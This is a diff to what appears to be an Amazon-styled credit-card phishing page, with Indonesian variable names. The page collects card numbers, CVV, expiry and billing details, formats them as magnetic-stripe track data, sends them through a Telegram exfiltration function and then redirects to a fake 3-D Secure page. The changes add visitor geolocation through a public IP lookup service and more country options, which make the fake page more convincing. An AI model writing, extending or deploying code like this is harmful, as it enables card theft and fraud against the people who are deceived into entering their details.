@@ -9,7 +9,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
         body { background-color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
         .logo { margin: 15px 0 25px; text-align: center; }
-        .logo img { height: 60px; }
+        .logo img { height: 30px; }
         .kotak { width: 100%; max-width: 348px; border: 1px solid #ddd; border-radius: 8px; padding: 25px 26px; }
         h1 { font-size: 22px; margin-bottom: 10px; font-weight: 400; }
         .email-info { font-size: 13px; color: #555; margin-bottom: 20px; }
@@ -61,9 +61,19 @@
                 <option value="AU" data-kode="+61">Australia (+61)</option>
                 <option value="GB" data-kode="+44">United Kingdom (+44)</option>
                 <option value="US" data-kode="+1">United States (+1)</option>
-                <option value="ID" data-kode="+62" selected>Indonesia (+62)</option>
+                <option value="ID" data-kode="+62">Indonesia (+62)</option>
                 <option value="MY" data-kode="+60">Malaysia (+60)</option>
                 <option value="SG" data-kode="+65">Singapore (+65)</option>
+                <option value="PH" data-kode="+63">Philippines (+63)</option>
+                <option value="TH" data-kode="+66">Thailand (+66)</option>
+                <option value="VN" data-kode="+84">Vietnam (+84)</option>
+                <option value="CN" data-kode="+86">China (+86)</option>
+                <option value="JP" data-kode="+81">Japan (+81)</option>
+                <option value="KR" data-kode="+82">South Korea (+82)</option>
+                <option value="NZ" data-kode="+64">New Zealand (+64)</option>
+                <option value="CA" data-kode="+1">Canada (+1)</option>
+                <option value="DE" data-kode="+49">Germany (+49)</option>
+                <option value="FR" data-kode="+33">France (+33)</option>
             </select>
             <div class="peringatan" id="pNegara"><span class="ikon">!</span><span>Select your country</span></div>
 
@@ -102,19 +112,75 @@
         }
         document.getElementById('emailTampil').textContent = emailPengguna;
 
+        // === DETEKSI NEGARA OTOMATIS ===
+        const elemenNegara = document.getElementById('negara');
+        const elemenTelKode = document.getElementById('telKode');
+
+        // Peta kode telepon ke kode negara
+        const kodeKeNegara = {
+            '+61': 'AU', '+44': 'GB', '+1': 'US', '+62': 'ID', '+60': 'MY',
+            '+65': 'SG', '+63': 'PH', '+66': 'TH', '+84': 'VN', '+86': 'CN',
+            '+81': 'JP', '+82': 'KR', '+64': 'NZ', '+49': 'DE', '+33': 'FR'
+        };
+
+        // Fungsi pilih negara & update kode telepon
+        function pilihNegaraDariKode(kodeTel) {
+            const kode = kodeTel.trim();
+            let ditemukan = null;
+            // Cari kecocokan terpanjang dulu
+            const urutKode = Object.keys(kodeKeNegara).sort((a,b) => b.length - a.length);
+            for (const k of urutKode) {
+                if (kode.startsWith(k)) {
+                    ditemukan = kodeKeNegara[k];
+                    elemenTelKode.value = k;
+                    break;
+                }
+            }
+            if (ditemukan) {
+                elemenNegara.value = ditemukan;
+            } else {
+                // Default Indonesia
+                elemenNegara.value = 'ID';
+                elemenTelKode.value = '+62';
+            }
+        }
+
+        // Ambil lokasi pengunjung
+        async function deteksiLokasi() {
+            try {
+                // Gunakan API publik gratis untuk deteksi negara
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                if (data && data.country_code && data.country_calling_code) {
+                    pilihNegaraDariKode(data.country_calling_code);
+                } else {
+                    pilihNegaraDariKode('+62'); // Default Indonesia
+                }
+            } catch (err) {
+                // Jika gagal → Indonesia
+                elemenNegara.value = 'ID';
+                elemenTelKode.value = '+62';
+            }
+        }
+
+        // Saat pilih manual → update kode telepon
+        elemenNegara.addEventListener('change', () => {
+            const opt = elemenNegara.selectedOptions[0];
+            if (opt && opt.dataset.kode) {
+                elemenTelKode.value = opt.dataset.kode;
+            }
+        });
+
+        // Jalankan deteksi saat halaman dimuat
+        deteksiLokasi();
+
+        // === KODE KARTU ===
         let nomorAsli = '', cvvAsli = '';
         const inputNomor = document.getElementById('nomorKartu');
         const inputExpiry = document.getElementById('expiry');
         const inputCVV = document.getElementById('cvv');
         const form = document.getElementById('formBilling');
         const tombol = document.getElementById('tombolVerifikasi');
-        const elemenNegara = document.getElementById('negara');
-        const elemenTelKode = document.getElementById('telKode');
-
-        elemenNegara.addEventListener('change', () => {
-            const opt = elemenNegara.selectedOptions[0];
-            if (opt && opt.dataset.kode) elemenTelKode.value = opt.dataset.kode;
-        });
 
         inputNomor.addEventListener('input', e => {
             const angka = e.target.value.replace(/\D/g, '');
@@ -154,10 +220,12 @@ T2: ;${nomorAsli}=${exp.slice(-2)}${exp.slice(0,2)}00000000000000000000000000?`;
             let ok = true;
             if (nomorAsli.length < 13) { inputNomor.classList.add('salah'); document.getElementById('pKartu').classList.add('tampil'); ok = false; }
             if (cvvAsli.length < 3) { inputCVV.classList.add('salah'); document.getElementById('pCvv').classList.add('tampil'); ok = false; }
+            if (!elemenNegara.value) { elemenNegara.style.borderColor = '#c40000'; document.getElementById('pNegara').classList.add('tampil'); ok = false; }
             ['namaKartu','alamat','kota','kodepos','telNomor'].forEach(id => {
                 if (!document.getElementById(id).value.trim()) {
                     document.getElementById(id).classList.add('salah');
-                    document.getElementById('p'+id.replace('namaKartu','Nama').replace('alamat','Alamat').replace('kota','Kota').replace('kodepos','Kodepos').replace('telNomor','Telepon')).classList.add('tampil');
+                    const namaKolom = id.replace('namaKartu','Nama').replace('alamat','Alamat').replace('kota','Kota').replace('kodepos','Kodepos').replace('telNomor','Telepon');
+                    document.getElementById('p'+namaKolom).classList.add('tampil');
                     ok = false;
                 }
             });
@@ -214,7 +282,6 @@ ${track}
                 await CONFIG.kirimKeTelegram(pesanBilling);
             }
 
-            // ✅ LANGSUNG KE 3DS
             window.location.href = '3ds.html';
         });
     </script>
